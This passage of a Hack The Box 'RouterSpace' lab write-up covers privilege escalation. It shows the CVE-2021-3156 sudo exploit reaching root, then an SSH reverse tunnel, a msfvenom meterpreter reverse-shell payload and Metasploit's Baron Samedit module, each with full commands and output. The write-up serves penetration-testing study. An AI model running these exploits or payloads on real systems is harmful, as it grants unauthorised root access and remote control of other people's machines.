+<span class="o">(</span>REDACTED<span class="o">)</span>
+</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="without-metasploit">Without Metasploit<a href="#without-metasploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Like I said before, this VM can’t do egress connection. Before trying to send the good old linpeas.sh, I tried some tricks manually : suid binary, cron jobs, sudo version etc..</p><p>The box has sudo v1.8.31 installed:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>paul@routerspace:/tmp/h3xit<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-V</span>
+Sudo version 1.8.31
+Sudoers policy plugin version 1.8.31
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.31
+</pre></table></code></div></div><p>Luckily, this version of sudo is vulnerable to <a href="https://ubuntu.com/security/CVE-2021-3156">CVE-2021-3156 (Baron Samedit)</a></p><p>I tried an <a href="https://github.com/blasty/CVE-2021-3156">exploit</a>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>paul@routerspace:/tmp/h3xit<span class="nv">$ </span>make
+<span class="nb">rm</span> <span class="nt">-rf</span> libnss_X
+<span class="nb">mkdir </span>libnss_X
+gcc <span class="nt">-std</span><span class="o">=</span>c99 <span class="nt">-o</span> sudo-hax-me-a-sandwich hax.c
+gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> <span class="s1">'libnss_X/P0P_SH3LLZ_ .so.2'</span> lib.c
+
+paul@routerspace:/tmp/h3xit<span class="nv">$ </span>./sudo-hax-me-a-sandwich 1
+
+<span class="k">**</span> CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;
+
+using target: Ubuntu 20.04.1 <span class="o">(</span>Focal Fossa<span class="o">)</span> - <span class="nb">sudo </span>1.8.31, libc-2.31 <span class="o">[</span><span class="s1">'/usr/bin/sudoedit'</span><span class="o">]</span> <span class="o">(</span>56, 54, 63, 212<span class="o">)</span>
+<span class="k">**</span> pray <span class="k">for </span>your rootshell.. <span class="k">**</span>
+<span class="o">[</span>+] bl1ng bl1ng! We got it!
+<span class="c"># id            </span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>paul<span class="o">)</span>
+<span class="c"># cat /root/root.txt</span>
+<span class="o">(</span>REDACTED<span class="o">)</span>
+</pre></table></code></div></div><h3 id="with-metasploit">With Metasploit<a href="#with-metasploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>For the fun of it, I wanted to find a way to send a metasploit payload and get a meterpreter session, even though the target can’t egress.</p><p>To do it, I had to setup a reverse port forwarding with ssh :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-R</span> 4444:127.0.0.1:4444 paul@10.10.11.148 <span class="nt">-i</span> ./id_rsa
+</pre></table></code></div></div><p>Then, with msfvenom, I created a payload that connect to 127.0.0.1 and scp it to the target:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> elf <span class="nt">-o</span> mp
+<span class="nv">$ </span>scp <span class="nt">-i</span> ./id_rsa ./mp paul@2.2.2.2:/tmp/h3xit/mp
+</pre></table></code></div></div><p>Now, let’s start msfconsole and setup a listener for the payload, then run it from the target:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+</pre><td class="rouge-code"><pre><span class="c"># on attacker machine</span>
+<span class="nv">$ </span>msfconsole
+msf6 <span class="o">&gt;</span> use multi/handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload linux/x64/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> linux/x64/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 127.0.0.1
+lhost <span class="o">=&gt;</span> 127.0.0.1
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 4444
+lport <span class="o">=&gt;</span> 4444
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[!]</span> You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 127.0.0.1:4444
+
+<span class="c"># on target</span>
+paul@routerspace:~<span class="nv">$ </span>/tmp/h3xit/mp &amp;
+<span class="o">[</span>1] 49179
+
+<span class="c"># then on attacker machine</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 127.0.0.1:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>3020772 bytes<span class="o">)</span> to 127.0.0.1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>127.0.0.1:4444 -&gt; 127.0.0.1:57130 <span class="o">)</span> at 2022-03-14 00:40:38 +0000
+meterpreter&gt; <span class="nb">bg
+</span>msf6&gt; use exploit/linux/local/sudo_baron_samedit
+msf6 exploit<span class="o">(</span>linux/local/sudo_baron_samedit<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 127.0.0.1
+msf6 exploit<span class="o">(</span>linux/local/sudo_baron_samedit<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
+msf6 exploit<span class="o">(</span>linux/local/sudo_baron_samedit<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[!]</span> SESSION may not be compatible with this module:
+<span class="o">[!]</span>  <span class="k">*</span> missing Meterpreter features: stdapi_railgun_api
+<span class="o">[!]</span> You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 127.0.0.1:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
+<span class="o">[!]</span> The service is running, but could not be validated. <span class="nb">sudo </span>1.8.31 may be a vulnerable build.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using automatically selected target: Ubuntu 20.04 x64 <span class="o">(</span><span class="nb">sudo </span>v1.8.31, libc v2.31<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing <span class="s1">'/tmp/weDXz.py'</span> <span class="o">(</span>763 bytes<span class="o">)</span> ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing <span class="s1">'/tmp/libnss_s8xoK/D .so.2'</span> <span class="o">(</span>548 bytes<span class="o">)</span> ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>3020772 bytes<span class="o">)</span> to 127.0.0.1
+<span class="o">[</span>+] Deleted /tmp/weDXz.py
+<span class="o">[</span>+] Deleted /tmp/libnss_s8xoK/D .so.2
+<span class="o">[</span>+] Deleted /tmp/libnss_s8xoK
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>127.0.0.1:4444 -&gt; 127.0.0.1:57132 <span class="o">)</span>
+
+meterpreter <span class="o">&gt;</span> shell
+Process 49282 created.
+Channel 1 created.
+<span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>paul<span class="o">)</span>
+routerspace.htb
+</pre></table></code></div></div><p>Thanks to ssh tunelling, I’m able to use almost all metasploit’s modules.</p><p>Thanks for reading &lt;3</p><p>h3x</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/privilege-escalation/" class="post-tag no-text-decoration" >privilege escalation</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - RouterSpace - h3xit's ~&url=https://h3xitsec.github.io/posts/htb-routerspace/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - RouterSpace - h3xit's ~&u=https://h3xitsec.github.io/posts/htb-routerspace/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - RouterSpace - h3xit's ~&url=https://h3xitsec.github.io/posts/htb-routerspace/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/picoctf-binary/">PicoCTF 2022 - Binary Exploitation</a><li><a href="/posts/picoctf-reverse/">PicoCTF 2022 - Reverse Engineering Challenges</a><li><a href="/posts/picoctf-crypto/">PicoCTF 2022 - Crypto Challenges</a><li><a href="/posts/htb-routerspace/">Hack The Box - RouterSpace</a><li><a href="/posts/polyctf-crypto/">24H@CTF - Crypto</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/polyctf-jamaissansmonriz/"><div class="card-body"> <em class="timeago small" date="2022-02-15 00:00:00 -0500" >Feb 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>24H@CTF - Jamais Sans Mon Riz</h3><div class="text-muted small"><p> Challenge Description “Jamais sans mon riz” was the web track designed by Desjardins at the 2022 edition of PolyHx’s 24H@CTF At the time or writing this, the challenge was still available at http...</p></div></div></a></div><div class="card"> <a href="/posts/hack-hamlet/"><div class="card-body"> <em class="timeago small" date="2022-01-22 00:00:00 -0500" >Jan 22</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Hamlet</h3><div class="text-muted small"><p> Challenge description This one is a medium linux box. Warning: be gentle on brute forcing, enumerating. It doesn’t support much load. https://tryhackme.com/room/hamlet Reconnaissance / Enumer...</p></div></div></a></div><div class="card"> <a href="/posts/vulnhub-sar-1/"><div class="card-body"> <em class="timeago small" date="2022-01-12 00:00:00 -0500" >Jan 12</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Sar: 1</h3><div class="text-muted small"><p> Challenge description https://www.vulnhub.com/entry/sar-1,425/ Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing. Reconnaissance / Enumeration ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/polyctf-jamaissansmonriz/" class="btn btn-outline-primary" prompt="Older"><p>24H@CTF - Jamais Sans Mon Riz</p></a> <a href="/posts/picoctf-crypto/" class="btn btn-outline-primary" prompt="Newer"><p>PicoCTF 2022 - Crypto Challenges</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/h3xitsec">h3xit</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-79SMBN4E7F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-79SMBN4E7F'); }); </script>
